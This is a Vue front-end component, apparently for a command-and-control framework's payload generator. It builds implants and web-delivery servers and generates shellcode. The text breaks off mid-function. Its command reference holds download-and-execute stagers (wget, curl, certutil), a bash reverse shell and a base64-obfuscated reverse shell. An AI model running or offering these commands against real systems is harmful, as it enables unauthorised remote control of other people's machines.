<template>
  <div class="client-generator">
    <!-- 头部区域 -->
    <div class="header-section">
      <div class="header-content">
        <h1 class="page-title">{{ t('gen.title') }}</h1>
        <p class="page-subtitle">{{ t('gen.subtitle') }}</p>
      </div>
    </div>

    <!-- 功能选择卡片 -->
    <el-card class="function-selector-card" shadow="hover">
      <div class="function-selector">
        <div
            v-for="func in functions"
            :key="func.value"
            class="function-option"
            :class="{ 'function-selected': activeFunction === func.value }"
            @click="activeFunction = func.value"
        >
          <div class="function-icon-wrapper">
            <el-icon :class="['function-icon', `function-${func.value}`]">
              <component :is="func.icon" />
            </el-icon>
          </div>
          <div class="function-info">
            <div class="function-name">{{ func.label }}</div>
            <div class="function-desc">{{ func.description }}</div>
          </div>
        </div>
      </div>
    </el-card>

    <!-- 客户端生成功能 -->
    <template v-if="activeFunction === 'client'">
      <!-- 生成配置卡片 -->
      <el-card class="config-card" shadow="hover">
        <template #header>
          <div class="card-header">
            <div class="header-left">
              <el-icon class="card-icon"><Setting /></el-icon>
              <h3 class="card-title">{{ t('gen.configTitle') }}</h3>
            </div>
            <div class="header-right">
              <el-tag type="success" size="small">{{ t('gen.realtime') }}</el-tag>
            </div>
          </div>
        </template>
        <!-- 正向客户端复选框 -->
        <div class="forward-toggle-wrapper">
          <div
              class="forward-toggle"
              :class="{ 'is-active': formData.isForwardClient }"
              @click="formData.isForwardClient = !formData.isForwardClient; handleForwardClientChange(formData.isForwardClient)"
          >
            <div class="toggle-track">
              <div class="toggle-indicator"></div>
            </div>
            <div class="toggle-label">
      <span class="toggle-text" :class="{ 'active-text': formData.isForwardClient }">
        {{ formData.isForwardClient ? t('gen.forwardOn') : t('gen.forwardOff') }}
      </span>
              <el-tooltip :content="t('gen.forwardTip')" placement="right">
                <el-icon class="toggle-help-icon"><InfoFilled /></el-icon>
              </el-tooltip>
            </div>
          </div>
        </div>
        <div class="config-form">
          <el-form :model="formData" label-position="top" class="generator-form">
            <!-- Listener 选择 -->
            <!-- 监听器选择 / 正向客户端配置 -->
            <el-form-item :label="formData.isForwardClient ? t('gen.forwardConfig') : t('listener.title')" required>
              <!-- 正向客户端模式 -->
              <template v-if="formData.isForwardClient">
                <div class="forward-config">
                  <div class="forward-row">
                    <div class="forward-type">
                      <el-select
                          v-model="formData.forwardType"
                          :placeholder="t('gen.connMethod')"
                          class="forward-select"
                          size="large"
                      >
                        <el-option label="WebSocket" value="websocket">
                          <div class="forward-option">
                            <el-icon><Connection /></el-icon>
                            <span>WebSocket</span>
                          </div>
                        </el-option>
                        <el-option label="TCP" value="tcp">
                          <div class="forward-option">
                            <el-icon><Monitor /></el-icon>
                            <span>TCP</span>
                          </div>
                        </el-option>
                      </el-select>
                    </div>
                    <div class="forward-address">
                      <el-input
                          v-model="formData.forwardAddress"
                          placeholder="0.0.0.0:8080"
                          size="large"
                          clearable
                      >
                        <template #prefix>
                          <el-icon><Promotion /></el-icon>
                        </template>
                      </el-input>
                    </div>
                  </div>
                  <div class="form-hint">{{ t('gen.forwardAddrHint') }}</div>
                </div>
              </template>

              <!-- 普通监听器模式 -->
              <template v-else>
                <el-select
                    v-model="formData.listener"
                    :placeholder="t('gen.pickListener')"
                    class="form-select"
                    @visible-change="handleDropdown"
                    :loading="loadingListeners"
                    clearable
                    autocomplete="off"
                >
                  <template #prefix>
                    <el-icon><Connection /></el-icon>
                  </template>
                  <el-option
                      v-for="item in listenerOptions"
                      :key="item"
                      :label="item"
                      :value="item"
                  >
                    <div class="listener-option">
                      <el-icon class="option-icon"><Connection /></el-icon>
                      <span class="option-label">{{ item }}</span>
                    </div>
                  </el-option>
                  <template #empty>
                    <div class="empty-option">{{ t('gen.noListeners') }}</div>
                  </template>
                </el-select>
                <div class="form-hint">{{ t('gen.listenerHint') }}</div>
              </template>


            </el-form-item>

            <!-- 操作系统选择 -->
            <el-form-item :label="t('gen.os')" required>
              <div class="os-selector">
                <div
                    v-for="os in osOptions"
                    :key="os.value"
                    class="os-option"
                    :class="{ 'os-selected': formData.os === os.value }"
                    @click="selectOS(os.value)"
                >
                  <div class="os-icon-wrapper">
                    <el-icon :class="['os-icon', `os-${os.value}`]">
                      <component :is="os.icon" />
                    </el-icon>
                  </div>
                  <div class="os-info">
                    <div class="os-name">{{ os.label }}</div>
                    <div class="os-arch-count">
                      {{ archMapping[os.value]?.length || 0 }} {{ t('gen.archCount') }}
                    </div>
                  </div>
                  <el-icon
                      v-if="formData.os === os.value"
                      class="os-check"
                  >
                    <Check />
                  </el-icon>
                </div>
              </div>
            </el-form-item>

            <!-- 架构选择 -->
            <el-form-item :label="t('gen.arch')" required>
              <div class="arch-grid">
                <div
                    v-for="arch in archOptions"
                    :key="arch"
                    class="arch-option"
                    :class="{
                    'arch-selected': formData.arch === arch,
                    'arch-disabled': !formData.os
                  }"
                    @click="formData.os && selectArch(arch)"
                >
                  <div class="arch-icon">
                    <el-icon class="arch-icon-svg"><Cpu /></el-icon>
                  </div>
                  <div class="arch-info">
                    <div class="arch-name">{{ arch.toUpperCase() }}</div>
                    <div class="arch-desc">{{ getArchDescription(arch) }}</div>
                  </div>
                </div>
              </div>
              <div class="form-hint">{{ t('gen.archHint') }}</div>
            </el-form-item>

            <!-- 上线密码 -->
            <el-form-item :label="t('gen.connPwd')">
              <div class="password-input-wrapper">
                <el-input
                    v-model="formData.pass"
                    :placeholder="t('gen.connPwdPh')"
                    type="password"
                    show-password
                    clearable
                    class="password-input"
                    :maxlength="32"
                    autocomplete="new-password"
                >
                  <template #prefix>
                    <el-icon><Lock /></el-icon>
                  </template>
                </el-input>
                <el-tooltip :content="t('gen.genRandomPwd')" placement="top">
                  <el-button
                      class="generate-password-btn"
                      @click="generateRandomPassword"
                      :icon="Refresh"
                      circle
                      size="small"
                  />
                </el-tooltip>
              </div>
              <div class="form-hint">{{ t('gen.connPwdHint') }}</div>
              <div v-if="formData.pass" class="password-strength">
                <div class="strength-meter">
                  <div
                      class="strength-bar"
                      :style="{ width: `${passwordStrength}%` }"
                  ></div>
                </div>
                <span class="strength-text">{{ t('gen.pwdStrength') }}{{ passwordStrengthText }}</span>
              </div>
            </el-form-item>

            <!-- 生成按钮 -->
            <el-form-item>
              <el-button
                  type="primary"
                  @click="handleGenerate"
                  :disabled="!isFormValid"
                  :loading="generating"
                  class="generate-btn"
                  size="large"
              >
                <el-icon><Download /></el-icon>
                {{ t('gen.generate') }}
              </el-button>
              <div class="form-hint" v-if="isFormValid">
                {{ t('gen.willGenerate') }} {{ getFileName() }}
              </div>
            </el-form-item>
          </el-form>
        </div>
      </el-card>

      <!-- 使用命令参考 -->
      <el-card class="commands-card" shadow="hover">
        <template #header>
          <div class="card-header">
            <div class="header-left">
              <el-icon class="card-icon"><Promotion /></el-icon>
              <h3 class="card-title">{{ t('gen.cmdRefTitle') }}</h3>
            </div>
            <div class="header-right">
              <el-tooltip :content="t('gen.copyAll')" placement="top">
                <el-button
                    type="info"
                    size="small"
                    :icon="CopyDocument"
                    @click="copyAllCommands"
                >
                  {{ t('gen.copyAll') }}
                </el-button>
              </el-tooltip>
            </div>
          </div>
        </template>

        <div class="commands-grid">
          <div
              v-for="(cmd, index) in commands"
              :key="index"
              class="command-card"
              :class="`command-type-${index % 4}`"
          >
            <div class="command-header">
              <div class="command-type">
                <el-icon class="type-icon">
                  <component :is="cmd.icon" />
                </el-icon>
                <span class="type-name">{{ cmd.name }}</span>
              </div>
              <el-tooltip :content="t('common.copy')" placement="top">
                <el-button
                    type="text"
                    :icon="CopyDocument"
                    @click="copyToClipboard(cmd.code)"
                    class="copy-btn"
                />
              </el-tooltip>
            </div>
            <div class="command-content">
              <pre class="command-code">{{ cmd.code }}</pre>
              <div class="command-desc">{{ cmd.description }}</div>
            </div>
          </div>
        </div>
      </el-card>
    </template>

    <!-- Web投递功能 -->
    <template v-else-if="activeFunction === 'web'">
      <!-- 统计卡片 -->
      <div class="stats-cards">
        <el-card class="stat-card">
          <div class="stat-content">
            <el-icon class="stat-icon total-icon"><DataLine /></el-icon>
            <div class="stat-info">
              <div class="stat-value">{{ webTableData.length }}</div>
              <div class="stat-label">{{ t('listener.total') }}</div>
            </div>
          </div>
        </el-card>

        <el-card class="stat-card">
          <div class="stat-content">
            <el-icon class="stat-icon active-icon"><CircleCheck /></el-icon>
            <div class="stat-info">
              <div class="stat-value">{{ activeDeliveries }}</div>
              <div class="stat-label">{{ t('listener.active') }}</div>
            </div>
          </div>
        </el-card>

        <el-card class="stat-card">
          <div class="stat-content">
            <el-icon class="stat-icon inactive-icon"><CircleClose /></el-icon>
            <div class="stat-info">
              <div class="stat-value">{{ inactiveDeliveries }}</div>
              <div class="stat-label">{{ t('listener.inactive') }}</div>
            </div>
          </div>
        </el-card>
      </div>

      <!-- 主表格 -->
      <el-card class="main-table-card" shadow="hover">
        <template #header>
          <div class="table-header">
            <h3 class="table-title">{{ t('gen.webListTitle') }}</h3>
            <div class="table-actions">
              <el-button
                  type="primary"
                  size="small"
                  @click="dialogVisible = true"
              >
                <el-icon><Plus /></el-icon>
                {{ t('common.add') }}
              </el-button>
              <el-tooltip :content="t('common.refresh')" placement="top">
                <el-button
                    type="info"
                    size="small"
                    @click="getWebDeliveryList"
                    :loading="webLoading"
                >
                  <el-icon><Refresh /></el-icon>
                </el-button>
              </el-tooltip>
            </div>
          </div>
        </template>

        <el-table
            :data="webTableData"
            class="custom-table"
            v-loading="webLoading"
            :empty-text="t('gen.webEmpty')"
        >
          <el-table-column prop="ListenerConfig" :label="t('gen.listenerCol')" min-width="180">
            <template #default="{ row }">
              <div class="listener-cell">
                <el-icon class="listener-icon"><Connection /></el-icon>
                <div class="listener-content">
                  <div class="listener-text">{{ row.ListenerConfig }}</div>
                  <div class="listener-label">{{ t('gen.listenerCol') }}</div>
                </div>
              </div>
            </template>
          </el-table-column>

          <el-table-column prop="OS" :label="t('gen.os')" width="140">
            <template #default="{ row }">
              <el-tag
                  :type="row.OS === 'windows' ? 'primary' : row.OS === 'linux' ? 'success' : 'info'"
                  class="os-tag"
                  effect="light"
                  round
              >
                {{ row.OS }}
              </el-tag>
            </template>
          </el-table-column>

          <el-table-column prop="Arch" :label="t('gen.arch')" width="120">
            <template #default="{ row }">
              <div class="arch-cell">
                <el-icon class="arch-icon"><Cpu /></el-icon>
                <span class="arch-text">{{ row.Arch.toUpperCase() }}</span>
              </div>
            </template>
          </el-table-column>

          <el-table-column prop="Pass" :label="t('gen.onlinePwd')" width="150">
            <template #default="{ row }">
              <div class="password-cell">
                <el-icon class="password-icon"><Lock /></el-icon>
                <span class="password-text">{{ row.Pass || t('gen.notSet') }}</span>
              </div>
            </template>
          </el-table-column>

          <el-table-column prop="ListeningPort" :label="t('gen.listenPort')" width="120">
            <template #default="{ row }">
              <div class="port-cell">
                <el-tag type="info" effect="plain" class="port-tag">
                  {{ row.ListeningPort }}
                </el-tag>
              </div>
            </template>
          </el-table-column>

          <el-table-column :label="t('common.status')" width="120">
            <template #default="{ row }">
              <div class="status-cell">
                <div
                    class="status-dot"
                    :class="{ 'status-active': row.Status === 1, 'status-inactive': row.Status === 2 }"
                ></div>
                <el-tag
                    :type="row.Status === 1 ? 'success' : 'danger'"
                    size="small"
                    class="status-tag"
                    effect="light"
                >
                  {{ row.Status === 1 ? t('listener.running') : t('listener.stopped') }}
                </el-tag>
              </div>
            </template>
          </el-table-column>

          <el-table-column :label="t('common.actions')" width="280">
            <template #default="{ row }">
              <div class="action-buttons">
                <el-popover
                    placement="top-start"
                    :width="row.OS === 'windows' ? 480 : 520"
                    trigger="click"
                    class="command-popover"
                >
                  <template #reference>
                    <el-button
                        size="small"
                        type="success"
                        :disabled="row.Status !== 1"
                        class="action-btn"
                    >
                      <el-tooltip :content="t('gen.viewCmd')" placement="top">
                        <el-icon><Promotion /></el-icon>
                      </el-tooltip>
                    </el-button>
                  </template>
                  <div class="command-content">
                    <h4 class="command-title">{{ t('gen.onlineCmd') }}</h4>
                    <pre class="command-code">{{ generateWebCommand(row) }}</pre>
                    <div class="command-actions">
                      <el-button
                          size="small"
                          type="primary"
                          @click="copyToClipboard(generateWebCommand(row))"
                      >
                        <el-icon><CopyDocument /></el-icon>
                        {{ t('common.copy') }}
                      </el-button>
                    </div>
                  </div>
                </el-popover>

                <el-tooltip
                    v-if="row.OS === 'windows' && row.Status === 1"
                    :content="t('gen.genShellcode')"
                    placement="top"
                >
                  <el-button
                      size="small"
                      type="warning"
                      class="action-btn"
                      @click="openShellcodeDialog(row)"
                  >
                    <el-icon><MagicStick /></el-icon>
                  </el-button>
                </el-tooltip>

                <el-tooltip
                    :content="row.Status === 1 ? t('gen.stopService') : t('gen.startService')"
                    placement="top"
                >
                  <el-button
                      size="small"
                      :type="row.Status === 1 ? 'primary' : 'success'"
                      class="action-btn"
                      @click="row.Status === 1 ? handleWebClose(row) : handleWebOpen(row)"
                  >
                    <el-icon>
                      <component :is="row.Status === 1 ? VideoPause : VideoPlay" />
                    </el-icon>
                  </el-button>
                </el-tooltip>

                <el-tooltip :content="t('common.delete')" placement="top">
                  <el-button
                      size="small"
                      type="danger"
                      class="action-btn"
                      @click="handleWebDelete(row)"
                  >
                    <el-icon><Delete /></el-icon>
                  </el-button>
                </el-tooltip>
              </div>
            </template>
          </el-table-column>
        </el-table>
      </el-card>
    </template>

    <!-- WebDelivery新增对话框 -->
    <el-dialog
        v-model="dialogVisible"
        :title="t('gen.configWeb')"
        width="750px"
        class="add-dialog"
        :close-on-click-modal="false"
    >
      <div class="dialog-content">
        <el-form :model="webFormData" label-position="top" class="config-form">
          <el-form-item :label="t('gen.listenerCol')" required>
            <el-select
                v-model="webFormData.listener"
                :placeholder="t('gen.pickListener')"
                class="form-select"
                @visible-change="handleDropdown"
                :loading="loadingListeners"
                clearable
                filterable
                size="large"
                autocomplete="off"
            >
              <template #prefix>
                <el-icon><Connection /></el-icon>
              </template>
              <el-option
                  v-for="item in listenerOptions"
                  :key="item"
                  :label="item"
                  :value="item"
              >
                <div class="listener-option">
                  <el-icon class="option-icon"><Connection /></el-icon>
                  <span class="option-label">{{ item }}</span>
                </div>
              </el-option>
              <template #empty>
                <div class="empty-option">{{ t('gen.noListeners') }}</div>
              </template>
            </el-select>
            <div class="form-hint">{{ t('gen.listenerHint') }}</div>
          </el-form-item>

          <div class="row-group">
            <el-form-item :label="t('gen.os')" required class="half-width">
              <div class="os-selector">
                <div
                    v-for="os in osOptions"
                    :key="os.value"
                    class="os-option"
                    :class="{ 'os-selected': webFormData.os === os.value }"
                    @click="selectWebOS(os.value)"
                >
                  <div class="os-icon-wrapper">
                    <el-icon :class="['os-icon', `os-${os.value}`]">
                      <component :is="os.icon" />
                    </el-icon>
                  </div>
                  <div class="os-name">{{ os.label }}</div>
                </div>
              </div>
            </el-form-item>

            <el-form-item :label="t('gen.arch')" required class="half-width">
              <el-select
                  v-model="webFormData.arch"
                  :placeholder="t('gen.pickArch')"
                  :disabled="!webFormData.os"
                  size="large"
                  class="arch-select"
              >
                <template #prefix>
                  <el-icon><Cpu /></el-icon>
                </template>
                <el-option
                    v-for="arch in webArchOptions"
                    :key="arch"
                    :label="arch.toUpperCase()"
                    :value="arch"
                >
                  <div class="arch-option-item">
                    <el-icon><Cpu /></el-icon>
                    <span class="arch-label">{{ arch.toUpperCase() }}</span>
                    <span class="arch-desc">{{ getArchDescription(arch) }}</span>
                  </div>
                </el-option>
              </el-select>
            </el-form-item>
          </div>

          <div class="row-group">
            <el-form-item :label="t('gen.listenPort')" required class="half-width">
              <el-input
                  v-model="webFormData.port"
                  :placeholder="t('gen.portExample')"
                  size="large"
                  clearable
              >
                <template #prefix>
                  <el-icon><Monitor /></el-icon>
                </template>
              </el-input>
              <div class="form-hint">{{ t('gen.webPortHint') }}</div>
            </el-form-item>

            <el-form-item :label="t('gen.fileName')" class="half-width">
              <el-input
                  v-model="webFormData.filename"
                  :placeholder="t('gen.fileNameExample')"
                  size="large"
                  clearable
              >
                <template #prefix>
                  <el-icon><Document /></el-icon>
                </template>
              </el-input>
              <div class="form-hint">{{ t('gen.fileNameHint') }}</div>
            </el-form-item>
          </div>

          <el-form-item :label="t('gen.connPwd')">
            <div class="password-input-wrapper">
              <el-input
                  v-model="webFormData.pass"
                  :placeholder="t('gen.connPwdOptional')"
                  type="password"
                  show-password
                  clearable
                  size="large"
                  class="password-input"
                  :maxlength="32"
                  autocomplete="new-password"
              >
                <template #prefix>
                  <el-icon><Lock /></el-icon>
                </template>
              </el-input>
              <el-tooltip :content="t('gen.genRandomPwd')" placement="top">
                <el-button
                    class="generate-password-btn"
                    @click="generateRandomWebPassword"
                    :icon="Refresh"
                    circle
                    size="small"
                />
              </el-tooltip>
            </div>
            <div class="form-hint">{{ t('gen.connPwdHint2') }}</div>
          </el-form-item>

        </el-form>
      </div>

      <template #footer>
        <div class="dialog-footer">
          <el-button @click="dialogVisible = false" :disabled="submitting">
            {{ t('common.cancel') }}
          </el-button>
          <el-button
              type="primary"
              @click="handleWebDelivery"
              :loading="submitting"
              :disabled="!isWebFormValid"
          >
            <template #default>
              <span v-if="!submitting">{{ t('gen.createWeb') }}</span>
              <span v-else>{{ t('gen.creating') }}</span>
            </template>
          </el-button>
        </div>
      </template>
    </el-dialog>

    <!-- Shellcode生成对话框 -->
    <el-dialog
        v-model="dialogVisible2"
        :title="t('gen.stageScTitle')"
        width="480px"
        class="shellcode-dialog"
        :close-on-click-modal="false"
    >
      <div class="dialog-content">
        <div class="shellcode-info">
          <div class="info-item">
            <span class="info-label">{{ t('gen.listenerCol') }}:</span>
            <span class="info-value">{{ selectedListener }}</span>
          </div>
          <div class="info-item">
            <span class="info-label">{{ t('gen.listenPort') }}:</span>
            <span class="info-value">{{ selectedPort }}</span>
          </div>
        </div>

        <el-form :model="selectedFormat" label-position="top" class="format-form">
          <el-form-item :label="t('gen.outputFormat')" required>
            <div class="format-grid">
              <div
                  v-for="format in formatOptions"
                  :key="format.value"
                  class="format-option"
                  :class="{ 'format-selected': selectedFormat.format === format.value }"
                  @click="selectedFormat.format = format.value"
              >
                <div class="format-icon">
                  <el-icon class="format-icon-svg">
                    <component :is="format.icon" />
                  </el-icon>
                </div>
                <div class="format-info">
                  <div class="format-name">{{ format.label }}</div>
                  <div class="format-desc">{{ format.description }}</div>
                </div>
                <el-icon
                    v-if="selectedFormat.format === format.value"
                    class="format-check"
                >
                  <Check />
                </el-icon>
              </div>
            </div>
          </el-form-item>
        </el-form>
      </div>

      <template #footer>
        <div class="dialog-footer">
          <el-button @click="dialogVisible2 = false">
            {{ t('common.cancel') }}
          </el-button>
          <el-button
              type="primary"
              @click="handleStageShellcode"
              :loading="generatinBackendTemplatecode"
              :disabled="!selectedFormat.format"
          >
            {{ t('gen.genDownload') }}
          </el-button>
        </div>
      </template>
    </el-dialog>
  </div>
</template>

<script setup lang="ts">
import { useI18n } from 'vue-i18n'
const { t } = useI18n()
import { reactive, ref, computed, onMounted } from 'vue';
import { ElMessage, ElMessageBox } from 'element-plus';
import {
  Monitor,
  Cpu,
  Setting,
  Connection,
  Check,
  Lock,
  Refresh,
  Download,
  CopyDocument,
  Promotion,
  InfoFilled,
  Apple,
  MagicStick,
  Odometer,
  ChatLineSquare,
  SwitchButton,
  DataLine,
  CircleCheck,
  CircleClose,
  Document,
  VideoPlay,
  VideoPause,
  Delete,
  Warning,
  SuccessFilled
} from '@element-plus/icons-vue';
import ClientAPI from "@/api/clients";

// 功能选项
const functions = computed(() => [
  { label: t('gen.funcClient'), value: 'client', icon: Download, description: t('gen.funcClientDesc') },
  { label: t('gen.funcWeb'), value: 'web', icon: Promotion, description: t('gen.funcWebDesc') }
]);

const activeFunction = ref('client');

// 操作系统选项
const osOptions = [
  { label: 'Windows', value: 'windows', icon: Monitor },
  { label: 'Linux', value: 'linux', icon: Monitor },
  { label: 'macOS', value: 'darwin', icon: Monitor }
];

// 架构映射
const archMapping: Record<string, string[]> = {
  windows: ['amd64', '386'],
  linux: ['amd64', '386', 'arm', 'arm64', 'loong64', 'mips', 'mipsle', 'mips64', 'mips64le'],
  darwin: ['amd64', 'arm64']
};

// 架构描述
const archDescriptions = computed<Record<string, string>>(() => ({
  'amd64': t('gen.archAmd64'),
  '386': t('gen.arch386'),
  'arm': t('gen.archArm'),
  'arm64': t('gen.archArm64'),
  'loong64': t('gen.archLoong64'),
  'mips': t('gen.archMips'),
  'mipsle': t('gen.archMipsle'),
  'mips64': t('gen.archMips64'),
  'mips64le': t('gen.archMips64le')
}));
// 正向客户端切换处理
const handleForwardClientChange = (value: boolean) => {
  if (value) {
    // 切换到正向模式，清空监听器选择
    formData.listener = '';
  }
};

// 生成正向客户端监听器字符串
const getForwardListenerString = () => {
  if (!formData.isForwardClient) return formData.listener;
  return `forward-${formData.forwardType}://${formData.forwardAddress}`;
};
// 格式选项
const formatOptions = computed(() => [
  { value: 'hex', label: t('gen.fmtHex'), icon: Warning, description: t('gen.fmtHexDesc') },
  { value: 'c', label: t('gen.fmtC'), icon: Document, description: t('gen.fmtCDesc') },
  { value: 'bin', label: t('gen.fmtBin'), icon: SuccessFilled, description: t('gen.fmtBinDesc') },
  { value: 'exe', label: t('gen.fmtExe'), icon: Download, description: t('gen.fmtExeDesc') }
]);

// 客户端生成相关
const listenerOptions = ref<string[]>([]);
const loadingListeners = ref(false);
const generating = ref(false);

const formData = reactive({
  listener: '',
  os: '',
  arch: '',
  pass: '',
  isForwardClient: false,      // 新增：是否正向客户端
  forwardType: 'websocket',    // 新增：正向连接类型
  forwardAddress: ''           // 新增：正向监听地址
});

const archOptions = ref<string[]>([]);

// Web投递相关
const webTableData = ref([]);
const webLoading = ref(false);
const dialogVisible = ref(false);
const dialogVisible2 = ref(false);
const submitting = ref(false);
const generatinBackendTemplatecode = ref(false);
const webFormData = reactive({
  port: '',
  listener: '',
  os: '',
  arch: '',
  filename: '',
  pass: ''
});
const webArchOptions = ref<string[]>([]);
const selectedListener = ref('');
const selectedPort = ref('');
const selectedFormat = reactive({ format: '' });

// 计算属性
const activeDeliveries = computed(() => {
  return (webTableData.value as any[]).filter(item => item.Status === 1).length;
});

const inactiveDeliveries = computed(() => {
  return (webTableData.value as any[]).filter(item => item.Status === 2).length;
});

const isFormValid = computed(() => {
  if (formData.isForwardClient) {
    return formData.forwardType && formData.forwardAddress && formData.os && formData.arch;
  }
  return formData.listener && formData.os && formData.arch;
});

const isWebFormValid = computed(() => {
  return webFormData.listener && webFormData.os && webFormData.arch && webFormData.port;
});

const passwordStrength = computed(() => {
  if (!formData.pass) return 0;
  let score = 0;
  if (formData.pass.length >= 8) score += 20;
  if (formData.pass.length >= 12) score += 20;
  if (/[a-z]/.test(formData.pass)) score += 20;
  if (/[A-Z]/.test(formData.pass)) score += 20;
  if (/[0-9]/.test(formData.pass)) score += 20;
  if (/[^a-zA-Z0-9]/.test(formData.pass)) score += 20;
  return Math.min(score, 100);
});

const passwordStrengthText = computed(() => {
  const strength = passwordStrength.value;
  if (strength <= 40) return t('user.strengthWeak');
  if (strength <= 70) return t('user.strengthMid');
  return t('user.strengthStrong');
});

// 命令参考
const commands = computed(() => [
  {
    name: t('gen.cmdDirect'),
    code: './r_linux_amd64 [password]',
    description: t('gen.cmdDirectDesc'),
    icon: Odometer
  },
  {
    name: t('gen.cmdWget'),
    code: 'wget -P /tmp http://xxx.xxx.xxx.xxx:8000/r_linux_amd64; chmod +x /tmp/r_linux_amd64; nohup /tmp/r_linux_amd64 [password] > /dev/null 2>&1 &',
    description: t('gen.cmdWgetDesc'),
    icon: Download
  },
  {
    name: t('gen.cmdCurl'),
    code: 'curl -o /tmp/r_linux_amd64 http://xxx.xxx.xxx.xxx:8000/r_linux_amd64; chmod +x /tmp/r_linux_amd64; nohup /tmp/r_linux_amd64 [password] > /dev/null 2>&1 &',
    description: t('gen.cmdCurlDesc'),
    icon: Download
  },
  {
    name: t('gen.cmdBash'),
    code: 'bash -i >& /dev/tcp/xxx.xxx.xxx.xxx/2333 0>&1',
    description: t('gen.cmdBashDesc'),
    icon: ChatLineSquare
  },
  {
    name: t('gen.cmdBase64'),
    code: 'bash -c {echo,YmFzaCAtaSA+JiAvZGV2L3RjcC8xMjcuMC4wLjEvMjMzMyAwPiYx}|{base64,-d}|{bash,-i}',
    description: t('gen.cmdBase64Desc'),
    icon: MagicStick
  },
  {
    name: t('gen.cmdNohup'),
    code: 'nohup ./client [password] > /dev/null 2>&1 &',
    description: t('gen.cmdNohupDesc'),
    icon: SwitchButton
  }
]);

// 方法
const getArchDescription = (arch: string) => {
  return archDescriptions.value[arch] || t('gen.archUnknown');
};

const getFileName = () => {
  if (!formData.os || !formData.arch) return '';
  let fileName = `r_${formData.os}_${formData.arch}`;
  if (formData.os === 'windows') fileName += '.exe';
  return fileName;
};

const generateWebCommand = (row: any) => {
  if (row.OS === 'windows') {
    return `certutil -urlcache -split -f ${row.ServerAddress} C:\\temp\\r.exe && C:\\temp\\r.exe ${row.Pass || ''}`;
  } else {
    return `wget -P /tmp ${row.ServerAddress}; chmod +x /tmp/${row.FileName}; nohup /tmp/${row.FileName} ${row.Pass || ''} > /dev/null 2>&1 &`;
  }
};

const handleDropdown = async (visible: boolean) => {
  if (visible && listenerOptions.value.length === 0) {
    loadingListeners.value = true;
    try {
      const res = await ClientAPI.ShowListener();
      if (res.status === 200 && res.data.status === 200) {
        listenerOptions.value = res.data.data;
      } else {
        ElMessage.error(res.data?.data || t('listener.loadFailed'));
      }
    } catch (error) {
      console.error('failed to load listeners:', error);
      ElMessage.error(t('listener.loadFailed'));
    } finally {
      loadingListeners.value = false;
    }
  }
};

const selectOS = (os: string) => {
  formData.os = os;
  formData.arch = '';
  archOptions.value = archMapping[os] || [];
};

const selectArch = (arch: string) => {
  formData.arch = arch;
};

const selectWebOS = (os: string) => {
  webFormData.os = os;
  webFormData.arch = '';
  webArchOptions.value = archMapping[os] || [];
};

const generateRandomPassword = () => {
  // 仅使用字母数字，避免 shell 特殊字符导致命令行参数解析异常
  const chars = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789';
  let password = '';
  for (let i = 0; i < 16; i++) {
    password += chars.charAt(Math.floor(Math.random() * chars.length));
  }
  formData.pass = password;
  ElMessage.success(t('gen.randomPwdOk'));
};

const generateRandomWebPassword = () => {
  // 仅使用字母数字，避免 shell 特殊字符导致命令行参数解析异常
  const chars = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789';
  let password = '';
  for (let i = 0; i < 16; i++) {
    password += chars.charAt(Math.floor(Math.random() * chars.length));
  }
  webFormData.pass = password;
  ElMessage.success(t('gen.randomPwdOk'));
};

const handleGenerate = async () => {
  if (!isFormValid.value) {
    ElMessage.warning(t('listener.configIncomplete'));
    return;
  }

  generating.value = true;
  try {
    // 构造请求参数
    const requestData: any = {
      osType: formData.os,
      archType: formData.arch,
      pass: formData.pass
    };

    // 设置监听器字段
    if (formData.isForwardClient) {
      requestData.listener = getForwardListenerString();
    } else {
      requestData.listener = formData.listener;
    }

    const res = await ClientAPI.GenServer(requestData);

    if (res.status === 200) {
      const contentDisposition = res.headers['content-disposition'] || '';
      const matches = /filename[^;=\n]*=((['"]).*?\2|[^;\n]*)/.exec(contentDisposition);
      let fileName = matches && matches.length > 1
          ? decodeURIComponent(matches[1].replace(/['"]/g, ''))
          : getFileName();

      const blob = new Blob([res.data], { type: res.headers['content-type'] });
      const downloadElement = document.createElement('a');
      const href = window.URL.createObjectURL(blob);

      downloadElement.href = href;
      downloadElement.download = fileName;
      document.body.appendChild(downloadElement);
      downloadElement.click();
      document.body.removeChild(downloadElement);
      window.URL.revokeObjectURL(href);

      ElMessage.success(t('gen.generateOk'));
    } else {
      ElMessage.error(t('gen.generateFailed'));
    }
  } catch (error: any) {
    console.error('generate failed:', error);
    ElMessage.error(error.message || t('gen.generateFailed'));
  } finally {
    generating.value = false;
  }
};

const copyToClipboard = (text: string) => {
  navigator.clipboard.writeText(text).then(() => {
    ElMessage.success(t('common.copied'));
  }).catch(() => {
    ElMessage.error(t('gen.copyFailed'));
  });
};

const copyAllCommands = () => {
  const allCommands = commands.value.map(cmd => `# ${cmd.name}\n${cmd.code}\n`).join('\n');
  copyToClipboard(allCommands);
};

// WebDelivery相关方法
const getWebDeliveryList = async () => {
  webLoading.value = true;
  try {
    const res = await ClientAPI.GetWebDeliveryList();
    if (res.status === 200 && res.data.status === 200) {
      webTableData.value = res.data.data;
    } else {
      ElMessage.error(res.data?.data || t('gen.webListFailed'));
    }
  } catch (error) {
    console.error('failed to load WebDelivery list:', error);
    ElMessage.error(t('gen.webListFailed'));
  } finally {
    webLoading.value = false;
  }
};

const handleWebDelivery = async () => {
  if (!isWebFormValid.value) {
    ElMessage.warning(t('listener.configIncomplete'));
    return;
  }

  submitting.value = true;
  try {
    const res = await ClientAPI.StartWebDelivery({
      listener: webFormData.listener,
      os: webFormData.os,
      arch: webFormData.arch,
      port: webFormData.port,
      filename: webFormData.filename,
      pass: webFormData.pass
    });

    if (res.status === 200 && res.data.status === 200) {
      ElMessage.success(t('gen.webCreated'));
      dialogVisible.value = false;
      resetWebForm();
      await getWebDeliveryList();
    } else {
      ElMessage.error(res.data?.data || t('gen.createFailed'));
    }
  } catch (error) {
    console.error('failed to create WebDelivery:', error);
    ElMessage.error(t('gen.createFailed'));
  } finally {
    submitting.value = false;
  }
};

const handleWebClose = async (row: any) => {
  try {
    const res = await ClientAPI.CloseWebDelivery({ port: row.ListeningPort });
    if (res.status === 200 && res.data.status === 200) {
      ElMessage.success(t('gen.serviceStopped'));
      await getWebDeliveryList();
    } else {
      ElMessage.error(res.data?.data || t('gen.stopFailed'));
    }
  } catch (error) {
    console.error('failed to stop WebDelivery:', error);
